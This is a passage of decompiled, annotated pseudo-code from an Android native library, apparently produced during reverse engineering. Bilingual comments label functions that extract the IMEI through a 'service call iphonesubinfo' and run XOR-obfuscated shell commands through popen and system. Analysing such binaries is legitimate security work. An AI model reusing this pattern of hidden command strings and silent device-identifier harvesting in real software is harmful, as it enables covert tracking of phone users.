    bVar26 = (byte)((ulong)_DAT_001778a0 >> 0x20);
    bVar27 = (byte)((ulong)_DAT_001778a0 >> 0x28);
    bVar28 = (byte)((ulong)_DAT_001778a0 >> 0x30);
    bVar29 = (byte)((ulong)_DAT_001778a0 >> 0x38);
    bVar30 = (byte)_UNK_001778a8;
    bVar31 = (byte)((ulong)_UNK_001778a8 >> 8);
    bVar32 = (byte)((ulong)_UNK_001778a8 >> 0x10);
    bVar33 = (byte)((ulong)_UNK_001778a8 >> 0x18);
    bVar34 = (byte)((ulong)_UNK_001778a8 >> 0x20);
    bVar35 = (byte)((ulong)_UNK_001778a8 >> 0x28);
    bVar36 = (byte)((ulong)_UNK_001778a8 >> 0x30);
    bVar37 = (byte)((ulong)_UNK_001778a8 >> 0x38);
    *(byte *)(puVar14 + 6) = *(byte *)(puVar14 + 6) ^ 0xd5;
    puVar14[1] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar37,
                          CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar36,
                                   CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar35,
                                            CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar34,
                                                     CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar33
                                                              ,CONCAT12((byte)((ulong)uVar38 >> 0x10
                                                                              ) ^ bVar32,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar38 >> 8) ^ bVar31,(byte)uVar38 ^ bVar30)))))))
    ;
    *puVar14 = CONCAT17((byte)((ulong)uVar22 >> 0x38) ^ bVar29,
                        CONCAT16((byte)((ulong)uVar22 >> 0x30) ^ bVar28,
                                 CONCAT15((byte)((ulong)uVar22 >> 0x28) ^ bVar27,
                                          CONCAT14((byte)((ulong)uVar22 >> 0x20) ^ bVar26,
                                                   CONCAT13((byte)((ulong)uVar22 >> 0x18) ^ bVar25,
                                                            CONCAT12((byte)((ulong)uVar22 >> 0x10) ^
                                                                     bVar24,CONCAT11((byte)((ulong)
                                                  uVar22 >> 8) ^ bVar23,(byte)uVar22 ^ bVar21)))))))
    ;
    puVar14[3] = CONCAT17((byte)((ulong)uVar40 >> 0x38) ^ bVar37,
                          CONCAT16((byte)((ulong)uVar40 >> 0x30) ^ bVar36,
                                   CONCAT15((byte)((ulong)uVar40 >> 0x28) ^ bVar35,
                                            CONCAT14((byte)((ulong)uVar40 >> 0x20) ^ bVar34,
                                                     CONCAT13((byte)((ulong)uVar40 >> 0x18) ^ bVar33
                                                              ,CONCAT12((byte)((ulong)uVar40 >> 0x10
                                                                              ) ^ bVar32,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar40 >> 8) ^ bVar31,(byte)uVar40 ^ bVar30)))))))
    ;
    puVar14[2] = CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar29,
                          CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar28,
                                   CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar27,
                                            CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar26,
                                                     CONCAT13((byte)((ulong)uVar39 >> 0x18) ^ bVar25
                                                              ,CONCAT12((byte)((ulong)uVar39 >> 0x10
                                                                              ) ^ bVar24,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar39 >> 8) ^ bVar23,(byte)uVar39 ^ bVar21)))))))
    ;
    puVar14[5] = CONCAT17((byte)((ulong)uVar42 >> 0x38) ^ bVar37,
                          CONCAT16((byte)((ulong)uVar42 >> 0x30) ^ bVar36,
                                   CONCAT15((byte)((ulong)uVar42 >> 0x28) ^ bVar35,
                                            CONCAT14((byte)((ulong)uVar42 >> 0x20) ^ bVar34,
                                                     CONCAT13((byte)((ulong)uVar42 >> 0x18) ^ bVar33
                                                              ,CONCAT12((byte)((ulong)uVar42 >> 0x10
                                                                              ) ^ bVar32,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar42 >> 8) ^ bVar31,(byte)uVar42 ^ bVar30)))))))
    ;
    puVar14[4] = CONCAT17((byte)((ulong)uVar41 >> 0x38) ^ bVar29,
                          CONCAT16((byte)((ulong)uVar41 >> 0x30) ^ bVar28,
                                   CONCAT15((byte)((ulong)uVar41 >> 0x28) ^ bVar27,
                                            CONCAT14((byte)((ulong)uVar41 >> 0x20) ^ bVar26,
                                                     CONCAT13((byte)((ulong)uVar41 >> 0x18) ^ bVar25
                                                              ,CONCAT12((byte)((ulong)uVar41 >> 0x10
                                                                              ) ^ bVar24,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar41 >> 8) ^ bVar23,(byte)uVar41 ^ bVar21)))))))
    ;
  }
  pcVar15 = (char *)FUN_002295c4(&DAT_00234830);
  __stream = popen(pcVar15,"r");
  if (__stream == (FILE *)0x0) {
    bVar19 = false;
  }
  else {
    local_180 = 0;
    local_178 = 0;
    local_170 = (void *)0x0;
    pcVar15 = fgets(acStack_168,0x100,__stream);
    while (pcVar15 != (char *)0x0) {
      FUN_00205098(&local_180,acStack_168);
      pcVar15 = fgets(acStack_168,0x100,__stream);
    }
    pclose(__stream);
    pbVar12 = (byte *)FUN_002295c4(&DAT_00234890);
    if ((*pbVar12 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00234870);
      *puVar14 = DAT_00177ac8;
      *(undefined2 *)(puVar14 + 1) = 0x16b;
      FUN_002234c0(&LAB_001ab970,puVar14,0x2362d0);
      puVar18 = (undefined1 *)FUN_002295c4(&DAT_00234890);
      *puVar18 = 1;
      lVar13 = FUN_002295c4(&DAT_00234870);
      cVar3 = *(char *)(lVar13 + 9);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00234870);
      cVar3 = *(char *)(lVar13 + 9);
    }
    if (cVar3 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00234870);
      uVar22 = *puVar14;
      *(undefined1 *)((long)puVar14 + 9) = 0;
      bVar21 = (byte)DAT_00177918;
      uVar5 = (ulong)DAT_00177918 >> 8;
      uVar20 = (ulong)DAT_00177918 >> 0x10;
      uVar6 = (ulong)DAT_00177918 >> 0x18;
      uVar7 = (ulong)DAT_00177918 >> 0x20;
      uVar8 = (ulong)DAT_00177918 >> 0x28;
      uVar9 = (ulong)DAT_00177918 >> 0x30;
      uVar10 = (ulong)DAT_00177918 >> 0x38;
      *(byte *)(puVar14 + 1) = *(byte *)(puVar14 + 1) ^ 0x6b;
      *puVar14 = CONCAT17((byte)((ulong)uVar22 >> 0x38) ^ (byte)uVar10,
                          CONCAT16((byte)((ulong)uVar22 >> 0x30) ^ (byte)uVar9,
                                   CONCAT15((byte)((ulong)uVar22 >> 0x28) ^ (byte)uVar8,
                                            CONCAT14((byte)((ulong)uVar22 >> 0x20) ^ (byte)uVar7,
                                                     CONCAT13((byte)((ulong)uVar22 >> 0x18) ^
                                                              (byte)uVar6,
                                                              CONCAT12((byte)((ulong)uVar22 >> 0x10)
                                                                       ^ (byte)uVar20,
                                                                       CONCAT11((byte)((ulong)uVar22
                                                                                      >> 8) ^
                                                                                (byte)uVar5,
                                                                                (byte)uVar22 ^
                                                                                bVar21)))))));
    }
    __ptr = local_170;
    uVar5 = local_180;
    pvVar2 = (void *)((ulong)&local_180 | 1);
    if ((local_180 & 1) != 0) {
      pvVar2 = local_170;
    }
    pcVar15 = (char *)FUN_002295c4(&DAT_00234870);
    __n = strlen(pcVar15);
    if (__n == 0) {
      bVar19 = true;
    }
    else {
      uVar20 = uVar5 >> 1 & 0x7f;
      if ((uVar5 & 1) != 0) {
        uVar20 = local_178;
      }
      pvVar1 = (void *)((long)pvVar2 + uVar20);
      pvVar17 = pvVar1;
      if ((long)__n <= (long)uVar20) {
        pbVar12 = (byte *)FUN_002295c4(&DAT_00234870);
        bVar21 = *pbVar12;
        pvVar16 = pvVar2;
        do {
          pvVar17 = pvVar1;
          if ((0xfffffffffffffffe < uVar20 - __n) ||
             (pvVar16 = memchr(pvVar16,(uint)bVar21,(uVar20 - __n) + 1), pvVar16 == (void *)0x0))
          break;
          pvVar17 = (void *)FUN_002295c4(&DAT_00234870);
          iVar11 = memcmp(pvVar16,pvVar17,__n);
          pvVar17 = pvVar16;
          if (iVar11 == 0) break;
          pvVar16 = (void *)((long)pvVar16 + 1);
          uVar20 = (long)pvVar1 - (long)pvVar16;
          pvVar17 = pvVar1;
        } while ((long)__n <= (long)uVar20);
      }
      bVar19 = pvVar17 != pvVar1 && (long)pvVar17 - (long)pvVar2 != -1;
    }
    if ((uVar5 & 1) != 0) {
      free(__ptr);
    }
  }
  if (*(long *)(lVar4 + 0x28) != local_68) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return bVar19;
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001a50c4
 * Purpose (EN): IMEI Extractor via iphonesubinfo Parcel
 * Purpose (AR): استخراج IMEI عبر نداء service call iphonesubinfo
 */

// Function: FUN_001a50c4 @ 001a50c4
// ----------------------------------------------------------------

bool FUN_001a50c4(char *param_1)

{
  byte bVar1;
  long lVar2;
  bool bVar3;
  byte *pbVar4;
  char *pcVar5;
  size_t sVar6;
  undefined8 *puVar7;
  FILE *__stream;
  void *pvVar8;
  char *pcVar9;
  undefined8 uVar10;
  undefined1 *puVar11;
  undefined8 uVar12;
  char *__ptr;
  void *pvVar13;
  ulong uVar14;
  byte bVar15;
  ulong local_198;
  size_t local_190;
  void *local_188;
  byte local_180;
  byte bStack_17f;
  undefined6 uStack_17e;
  undefined2 uStack_178;
  undefined6 uStack_176;
  char *local_170;
  undefined6 local_168;
  undefined2 uStack_162;
  undefined6 uStack_160;
  ulong local_158;
  size_t local_150;
  void *local_148;
  long local_58;
  
  lVar2 = tpidr_el0;
  local_58 = *(long *)(lVar2 + 0x28);
  pbVar4 = (byte *)FUN_002295c4(&DAT_00234a50);
  if ((*pbVar4 & 1) == 0) {
    uVar10 = FUN_002295c4(&DAT_00234a30);
    FUN_001ac018(uVar10,&DAT_00178df3);
    FUN_002234c0(&LAB_001ac15c,uVar10,0x2362d0);
    puVar11 = (undefined1 *)FUN_002295c4(&DAT_00234a50);
    *puVar11 = 1;
  }
  pcVar5 = (char *)FUN_002295c4(&DAT_00234a30);
  FUN_001ac16c();
  sVar6 = strlen(pcVar5);
  if (0xffffffffffffffef < sVar6) {
                    /* WARNING: Subroutine does not return */
    FUN_00203188(&local_158);
  }
  if (sVar6 < 0x17) {
    pvVar13 = (void *)((ulong)&local_158 | 1);
    local_158 = CONCAT71(local_158._1_7_,(char)((int)sVar6 << 1));
    if (sVar6 != 0) goto LAB_001a5168;
  }
  else {
    uVar14 = sVar6 + 0x10 & 0xfffffffffffffff0;
    pvVar13 = (void *)FUN_00202bc0(uVar14);
    local_158 = uVar14 | 1;
    local_150 = sVar6;
    local_148 = pvVar13;
LAB_001a5168:
    pvVar8 = (void *)FUN_002295c4(&DAT_00234a30);
    memcpy(pvVar13,pvVar8,sVar6);
  }
  *(undefined1 *)((long)pvVar13 + sVar6) = 0;
  puVar7 = (undefined8 *)FUN_00205098(&local_158,param_1);
  uVar12 = puVar7[1];
  uVar10 = *puVar7;
  *puVar7 = 0;
  puVar7[1] = 0;
  local_170 = (char *)puVar7[2];
  puVar7[2] = 0;
  uStack_178 = (undefined2)uVar12;
  uStack_176 = (undefined6)((ulong)uVar12 >> 0x10);
  local_180 = (byte)uVar10;
  bStack_17f = (byte)((ulong)uVar10 >> 8);
  uStack_17e = (undefined6)((ulong)uVar10 >> 0x10);
  if ((local_158 & 1) != 0) {
    free(local_148);
  }
  __ptr = local_170;
  bVar15 = local_180 & 1;
  pcVar5 = (char *)((ulong)&local_180 | 1);
  if ((local_180 & 1) != 0) {
    pcVar5 = local_170;
  }
  __stream = popen(pcVar5,"r");
  if (__stream == (FILE *)0x0) {
LAB_001a5380:
    bVar3 = false;
    goto joined_r0x001a5398;
  }
  do {
    pcVar5 = fgets((char *)&local_158,0x100,__stream);
    if (pcVar5 == (char *)0x0) {
      pclose(__stream);
      pbVar4 = (byte *)FUN_002295c4(&DAT_00234a90);
      if ((*pbVar4 & 1) == 0) {
        uVar10 = FUN_002295c4(&DAT_00234a70);
        FUN_001ac1f8(uVar10,&DAT_00178e1a);
        FUN_002234c0(&LAB_001ac2f4,uVar10,0x2362d0);
        puVar11 = (undefined1 *)FUN_002295c4(&DAT_00234a90);
        *puVar11 = 1;
      }
      pcVar5 = (char *)FUN_002295c4(&DAT_00234a70);
      FUN_001ac304();
      sVar6 = strlen(pcVar5);
      if (0xffffffffffffffef < sVar6) {
                    /* WARNING: Subroutine does not return */
        FUN_00203188(&local_198);
      }
      if (sVar6 < 0x17) {
        pvVar13 = (void *)((ulong)&local_198 | 1);
        local_198 = CONCAT71(local_198._1_7_,(char)((int)sVar6 << 1));
        if (sVar6 != 0) goto LAB_001a5298;
      }
      else {
        uVar14 = sVar6 + 0x10 & 0xfffffffffffffff0;
        pvVar13 = (void *)FUN_00202bc0(uVar14);
        local_198 = uVar14 | 1;
        local_190 = sVar6;
        local_188 = pvVar13;
LAB_001a5298:
        pvVar8 = (void *)FUN_002295c4(&DAT_00234a70);
        memcpy(pvVar13,pvVar8,sVar6);
      }
      *(undefined1 *)((long)pvVar13 + sVar6) = 0;
      pbVar4 = (byte *)FUN_00205098(&local_198,param_1);
      uVar10 = *(undefined8 *)(pbVar4 + 8);
      __ptr = *(char **)(pbVar4 + 0x10);
      pbVar4[0x10] = 0;
      pbVar4[0x11] = 0;
      pbVar4[0x12] = 0;
      pbVar4[0x13] = 0;
      pbVar4[0x14] = 0;
      pbVar4[0x15] = 0;
      pbVar4[0x16] = 0;
      pbVar4[0x17] = 0;
      bVar1 = *pbVar4;
      bVar15 = pbVar4[1];
      uVar12 = *(undefined8 *)(pbVar4 + 2);
      pbVar4[0] = 0;
      pbVar4[1] = 0;
      pbVar4[2] = 0;
      pbVar4[3] = 0;
      pbVar4[4] = 0;
      pbVar4[5] = 0;
      pbVar4[6] = 0;
      pbVar4[7] = 0;
      pbVar4[8] = 0;
      pbVar4[9] = 0;
      pbVar4[10] = 0;
      pbVar4[0xb] = 0;
      pbVar4[0xc] = 0;
      pbVar4[0xd] = 0;
      pbVar4[0xe] = 0;
      pbVar4[0xf] = 0;
      local_168 = (undefined6)uVar12;
      uStack_162 = (undefined2)uVar10;
      uStack_160 = (undefined6)((ulong)uVar10 >> 0x10);
      if ((local_180 & 1) != 0) {
        free(local_170);
      }
      uStack_17e = local_168;
      uStack_178 = uStack_162;
      uStack_176 = uStack_160;
      local_180 = bVar1;
      bStack_17f = bVar15;
      local_170 = __ptr;
      if ((local_198 & 1) != 0) {
        free(local_188);
      }
      bVar15 = bVar1 & 1;
      pcVar5 = (char *)((ulong)&local_180 | 1);
      if ((bVar1 & 1) != 0) {
        pcVar5 = __ptr;
      }
      __stream = popen(pcVar5,"r");
      if (__stream == (FILE *)0x0) goto LAB_001a5380;
      pcVar5 = fgets((char *)&local_158,0x100,__stream);
      if (pcVar5 != (char *)0x0) goto LAB_001a534c;
      bVar3 = false;
      goto LAB_001a5390;
    }
    pcVar5 = strstr((char *)&local_158,param_1);
  } while (pcVar5 == (char *)0x0);
  bVar3 = true;
  goto LAB_001a5390;
  while (pcVar9 = fgets((char *)&local_158,0x100,__stream), pcVar9 != (char *)0x0) {
LAB_001a534c:
    pcVar5 = strstr((char *)&local_158,param_1);
    if (pcVar5 != (char *)0x0) break;
  }
  bVar3 = pcVar5 != (char *)0x0;
LAB_001a5390:
  pclose(__stream);
joined_r0x001a5398:
  if (bVar15 != 0) {
    free(__ptr);
  }
  if (*(long *)(lVar2 + 0x28) == local_58) {
    return bVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_0019b07c
 * Purpose (EN): Shell Process Execution & Pipe Output Reader
 * Purpose (AR): تنفيذ أوامر الشل عبر popen وقراءة المخرجات
 */

// Function: FUN_0019b07c @ 0019b07c
// ----------------------------------------------------------------

/* WARNING: Type propagation algorithm not settling */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0019b07c(void)

{
  long lVar1;
  undefined8 uVar2;
  undefined8 uVar3;
  undefined8 uVar4;
  undefined8 uVar5;
  undefined8 uVar6;
  undefined8 uVar7;
  undefined8 uVar8;
  undefined8 uVar9;
  int iVar10;
  size_t sVar11;
  FILE *__stream;
  char *pcVar12;
  char *pcVar13;
  undefined1 *puVar14;
  ulong *puVar15;
  char *pcVar16;
  char *pcVar17;
  ulong uVar18;
  undefined1 *puVar19;
  char *pcVar20;
  char *pcVar21;
  char *pcVar22;
  byte local_5e8 [16];
  void *local_5d8;
  ulong local_5d0;
  ulong uStack_5c8;
  char *local_5c0;
  ulong local_5b8;
  size_t local_5b0;
  undefined1 *local_5a8;
  ulong local_5a0;
  size_t local_598;
  undefined1 *local_590;
  ulong local_588;
  size_t local_580;
  undefined1 *local_578;
  ulong local_570;
  size_t local_568;
  char *local_560;
  ulong local_558;
  size_t local_550;
  char *local_548;
  ulong local_540;
  size_t local_538;
  char *local_530;
  ulong local_528;
  size_t local_520;
  char *local_518;
  ulong local_510;
  size_t local_508;
  char *local_500;
  undefined4 local_4f8;
  undefined2 local_4f4;
  undefined1 local_4f2;
  undefined4 local_4f0;
  undefined2 local_4ec;
  undefined1 local_4ea;
  ushort local_4e8 [4];
  undefined8 local_4e0;
  uint local_4d8;
  undefined1 local_4d4;
  undefined8 local_4d0;
  undefined2 local_4c8;
  char acStack_4c0 [1024];
  undefined8 local_c0;
  undefined8 uStack_b8;
  undefined8 uStack_b0;
  undefined8 uStack_a8;
  undefined8 local_a0;
  undefined2 local_98;
  long local_88;
  
  uVar9 = DAT_00177ab0;
  uVar8 = DAT_00177aa8;
  uVar7 = DAT_001779e8;
  uVar6 = DAT_001779a8;
  uVar5 = _UNK_00177228;
  uVar4 = _DAT_00177220;
  uVar3 = _UNK_00177148;
  uVar2 = _DAT_00177140;
  lVar1 = tpidr_el0;
  pcVar20 = (char *)((ulong)&local_510 | 1);
  pcVar21 = (char *)((ulong)&local_528 | 1);
  pcVar22 = (char *)((ulong)&local_540 | 1);
  pcVar17 = (char *)((ulong)&local_558 | 1);
  pcVar16 = (char *)((ulong)&local_570 | 1);
  local_88 = *(long *)(lVar1 + 0x28);
  puVar19 = (undefined1 *)((ulong)&local_5b8 | 1);
  do {
    local_4e8[0] = 0x82;
    local_a0 = uVar8;
    local_98 = 0x6c;
    uStack_b8 = uVar3;
    local_c0 = uVar2;
    uStack_a8 = uVar5;
    uStack_b0 = uVar4;
    sVar11 = strlen((char *)&local_c0);
    if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
      FUN_00203188(&local_510);
    }
    if (sVar11 < 0x17) {
      local_510 = CONCAT71(local_510._1_7_,(char)((int)sVar11 << 1));
      pcVar12 = pcVar20;
      if (sVar11 != 0) goto LAB_0019b1b8;
    }
    else {
      uVar18 = sVar11 + 0x10 & 0xfffffffffffffff0;
      pcVar12 = (char *)FUN_00202bc0(uVar18);
      local_510 = uVar18 | 1;
      local_508 = sVar11;
      local_500 = pcVar12;
LAB_0019b1b8:
      memcpy(pcVar12,&local_c0,sVar11);
    }
    pcVar12[sVar11] = '\0';
    local_4e8[0] = local_4e8[0] & 0xff ^ 0xf0;
    sVar11 = strlen((char *)local_4e8);
    if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
      FUN_00203188(&local_528);
    }
    if (sVar11 < 0x17) {
      local_528 = CONCAT71(local_528._1_7_,(char)((int)sVar11 << 1));
      pcVar12 = pcVar21;
      if (sVar11 != 0) goto LAB_0019b22c;
    }
    else {
      uVar18 = sVar11 + 0x10 & 0xfffffffffffffff0;
      pcVar12 = (char *)FUN_00202bc0(uVar18);
      local_528 = uVar18 | 1;
      local_520 = sVar11;
      local_518 = pcVar12;
LAB_0019b22c:
      memcpy(pcVar12,local_4e8,sVar11);
    }
    pcVar12[sVar11] = '\0';
    pcVar12 = pcVar20;
    if ((local_510 & 1) != 0) {
      pcVar12 = local_500;
    }
    pcVar13 = pcVar21;
    if ((local_528 & 1) != 0) {
      pcVar13 = local_518;
    }
    __stream = popen(pcVar12,pcVar13);
    memset(acStack_4c0,0,0x400);
    fgets(acStack_4c0,0x400,__stream);
    local_4ea = 0;
    local_4f0 = 0x63676f6c;
    local_4ec = 0x7461;
    sVar11 = strlen((char *)&local_4f0);
    if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
      FUN_00203188(&local_540);
    }
    if (sVar11 < 0x17) {
      local_540 = CONCAT71(local_540._1_7_,(char)((int)sVar11 << 1));
      pcVar12 = pcVar22;
      if (sVar11 != 0) goto LAB_0019b2f0;
    }
    else {
      uVar18 = sVar11 + 0x10 & 0xfffffffffffffff0;
      pcVar12 = (char *)FUN_00202bc0(uVar18);
      local_540 = uVar18 | 1;
      local_538 = sVar11;
      local_530 = pcVar12;
LAB_0019b2f0:
      memcpy(pcVar12,&local_4f0,sVar11);
    }
    pcVar12[sVar11] = '\0';
    pcVar12 = pcVar22;
    if ((local_540 & 1) != 0) {
      pcVar12 = local_530;
    }
    strtok(acStack_4c0,pcVar12);
    iVar10 = __strlen_chk(acStack_4c0,0x400);
    if (iVar10 < 3) {
      if ((local_510 & 1) == 0) {
        local_510 = local_510 & 0xffffffffffff0000;
        if ((local_528 & 1) == 0) goto LAB_0019b3c8;
LAB_0019b348:
        *local_518 = '\0';
        local_520 = 0;
        if ((local_540 & 1) == 0) goto LAB_0019b3d4;
LAB_0019b35c:
        *local_530 = '\0';
        local_538 = 0;
      }
      else {
        *local_500 = '\0';
        local_508 = 0;
        if ((local_528 & 1) != 0) goto LAB_0019b348;
LAB_0019b3c8:
        local_528 = local_528 & 0xffffffffffff0000;
        if ((local_540 & 1) != 0) goto LAB_0019b35c;
LAB_0019b3d4:
        local_540 = local_540 & 0xffffffffffff0000;
      }
      pclose(__stream);
    }
    else {
      local_4f2 = 0;
      local_4f8 = 0x6c656873;
      local_4f4 = 0x206c;
      sVar11 = strlen((char *)&local_4f8);
      if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
        FUN_00203188(&local_558);
      }
      if (sVar11 < 0x17) {
        local_558 = CONCAT71(local_558._1_7_,(char)((int)sVar11 << 1));
        pcVar12 = pcVar17;
        if (sVar11 != 0) goto LAB_0019b40c;
      }
      else {
        uVar18 = sVar11 + 0x10 & 0xfffffffffffffff0;
        pcVar12 = (char *)FUN_00202bc0(uVar18);
        local_558 = uVar18 | 1;
        local_550 = sVar11;
        local_548 = pcVar12;
LAB_0019b40c:
        memcpy(pcVar12,&local_4f8,sVar11);
      }
      pcVar12[sVar11] = '\0';
      pcVar12 = pcVar17;
      if ((local_558 & 1) != 0) {
        pcVar12 = local_548;
      }
      pcVar12 = strtok((char *)0x0,pcVar12);
      sVar11 = strlen(pcVar12);
      if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
        FUN_00203188(&local_570);
      }
      if (sVar11 < 0x17) {
        local_570 = CONCAT71(local_570._1_7_,(char)((int)sVar11 << 1));
        pcVar13 = pcVar16;
        if (sVar11 != 0) goto LAB_0019b48c;
      }
      else {
        uVar18 = sVar11 + 0x10 & 0xfffffffffffffff0;
        pcVar13 = (char *)FUN_00202bc0(uVar18);
        local_570 = uVar18 | 1;
        local_568 = sVar11;
        local_560 = pcVar13;
LAB_0019b48c:
        memcpy(pcVar13,pcVar12,sVar11);
      }
      pcVar13[sVar11] = '\0';
      pcVar12 = pcVar16;
      if ((local_570 & 1) != 0) {
        pcVar12 = local_560;
      }
      sVar11 = strlen(pcVar12);
      if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
        FUN_00203188(&local_588);
      }
      if (sVar11 < 0x17) {
        local_588 = CONCAT71(local_588._1_7_,(char)((int)sVar11 << 1));
        puVar14 = (undefined1 *)((ulong)&local_588 | 1);
        if (sVar11 != 0) goto LAB_0019b50c;
      }
      else {
        uVar18 = sVar11 + 0x10 & 0xfffffffffffffff0;
        puVar14 = (undefined1 *)FUN_00202bc0(uVar18);
        local_588 = uVar18 | 1;
        local_580 = sVar11;
        local_578 = puVar14;
LAB_0019b50c:
        memcpy(puVar14,pcVar12,sVar11);
      }
      puVar14[sVar11] = 0;
      local_4e0 = uVar9;
      local_4d0 = uVar6;
      local_4d8 = 0x97968c96;
      local_4c8 = 0x20;
      sVar11 = strlen((char *)&local_4d0);
      if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
        FUN_00203188(&local_5a0);
      }
      if (sVar11 < 0x17) {
        local_5a0 = CONCAT71(local_5a0._1_7_,(char)((int)sVar11 << 1));
        puVar14 = (undefined1 *)((ulong)&local_5a0 | 1);
        if (sVar11 != 0) goto LAB_0019b58c;
      }
      else {
        uVar18 = sVar11 + 0x10 & 0xfffffffffffffff0;
        puVar14 = (undefined1 *)FUN_00202bc0(uVar18);
        local_5a0 = uVar18 | 1;
        local_598 = sVar11;
        local_590 = puVar14;
LAB_0019b58c:
        memcpy(puVar14,&local_4d0,sVar11);
      }
      puVar14[sVar11] = 0;
      local_4d4 = 0;
      local_4e0 = CONCAT17((byte)((ulong)local_4e0 >> 0x38) ^ (byte)((ulong)uVar7 >> 0x38),
                           CONCAT16((byte)((ulong)local_4e0 >> 0x30) ^ (byte)((ulong)uVar7 >> 0x30),
                                    CONCAT15((byte)((ulong)local_4e0 >> 0x28) ^
                                             (byte)((ulong)uVar7 >> 0x28),
                                             CONCAT14((byte)((ulong)local_4e0 >> 0x20) ^
                                                      (byte)((ulong)uVar7 >> 0x20),
                                                      CONCAT13((byte)((ulong)local_4e0 >> 0x18) ^
                                                               (byte)((ulong)uVar7 >> 0x18),
                                                               CONCAT12((byte)((ulong)local_4e0 >>
                                                                              0x10) ^
                                                                        (byte)((ulong)uVar7 >> 0x10)
                                                                        ,CONCAT11((byte)((ulong)
                                                  local_4e0 >> 8) ^ (byte)((ulong)uVar7 >> 8),
                                                  (byte)local_4e0 ^ (byte)uVar7)))))));
      local_4d8 = local_4d8 ^ 0xfbfaf9f8;
      sVar11 = strlen((char *)&local_4e0);
      if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
        FUN_00203188(&local_5b8);
      }
      if (sVar11 < 0x17) {
        local_5b8 = CONCAT71(local_5b8._1_7_,(char)((int)sVar11 << 1));
        puVar14 = puVar19;
        if (sVar11 != 0) goto LAB_0019b63c;
      }
      else {
        uVar18 = sVar11 + 0x10 & 0xfffffffffffffff0;
        puVar14 = (undefined1 *)FUN_00202bc0(uVar18);
        local_5b8 = uVar18 | 1;
        local_5b0 = sVar11;
        local_5a8 = puVar14;
LAB_0019b63c:
        memcpy(puVar14,&local_4e0,sVar11);
      }
      puVar14[sVar11] = 0;
      FUN_0019b934(local_5e8,&local_5a0,&local_588);
      sVar11 = local_5b8 >> 1 & 0x7f;
      puVar14 = puVar19;
      if ((local_5b8 & 1) != 0) {
        sVar11 = local_5b0;
        puVar14 = local_5a8;
      }
      puVar15 = (ulong *)FUN_0020417c(local_5e8,puVar14,sVar11);
      uStack_5c8 = puVar15[1];
      local_5d0 = *puVar15;
      *puVar15 = 0;
      puVar15[1] = 0;
      local_5c0 = (char *)puVar15[2];
      puVar15[2] = 0;
      if ((local_5e8[0] & 1) != 0) {
        free(local_5d8);
      }
      pcVar13 = local_5c0;
      uVar18 = local_5d0;
      pcVar12 = (char *)((ulong)&local_5d0 | 1);
      if ((local_5d0 & 1) != 0) {
        pcVar12 = local_5c0;
      }
      system(pcVar12);
      if ((local_570 & 1) == 0) {
        local_570 = local_570 & 0xffffffffffff0000;
        if ((local_588 & 1) == 0) goto LAB_0019b7c4;
LAB_0019b6d4:
        *local_578 = 0;
        local_580 = 0;
        if ((local_510 & 1) == 0) goto LAB_0019b7d0;
LAB_0019b6e8:
        *local_500 = '\0';
        local_508 = 0;
        if ((local_528 & 1) == 0) goto LAB_0019b7dc;
LAB_0019b6fc:
        *local_518 = '\0';
        local_520 = 0;
        if ((local_540 & 1) == 0) goto LAB_0019b7e8;
LAB_0019b710:
        *local_530 = '\0';
        local_538 = 0;
        if ((local_558 & 1) == 0) goto LAB_0019b7f4;
LAB_0019b724:
        *local_548 = '\0';
        local_550 = 0;
        if ((local_5a0 & 1) == 0) goto LAB_0019b800;
LAB_0019b738:
        *local_590 = 0;
        local_598 = 0;
        if ((local_5b8 & 1) == 0) goto LAB_0019b80c;
LAB_0019b74c:
        *local_5a8 = 0;
        local_5b0 = 0;
        if ((uVar18 & 1) == 0) goto LAB_0019b814;
LAB_0019b75c:
        *pcVar13 = '\0';
        pclose(__stream);
        if ((uVar18 & 1) != 0) {
          free(pcVar13);
        }
      }
      else {
        *local_560 = '\0';
        local_568 = 0;
        if ((local_588 & 1) != 0) goto LAB_0019b6d4;
LAB_0019b7c4:
        local_588 = local_588 & 0xffffffffffff0000;
        if ((local_510 & 1) != 0) goto LAB_0019b6e8;
LAB_0019b7d0:
        local_510 = local_510 & 0xffffffffffff0000;
        if ((local_528 & 1) != 0) goto LAB_0019b6fc;
LAB_0019b7dc:
        local_528 = local_528 & 0xffffffffffff0000;
        if ((local_540 & 1) != 0) goto LAB_0019b710;
LAB_0019b7e8:
        local_540 = local_540 & 0xffffffffffff0000;
        if ((local_558 & 1) != 0) goto LAB_0019b724;
LAB_0019b7f4:
        local_558 = local_558 & 0xffffffffffff0000;
        if ((local_5a0 & 1) != 0) goto LAB_0019b738;
LAB_0019b800:
        local_5a0 = local_5a0 & 0xffffffffffff0000;
        if ((local_5b8 & 1) != 0) goto LAB_0019b74c;
LAB_0019b80c:
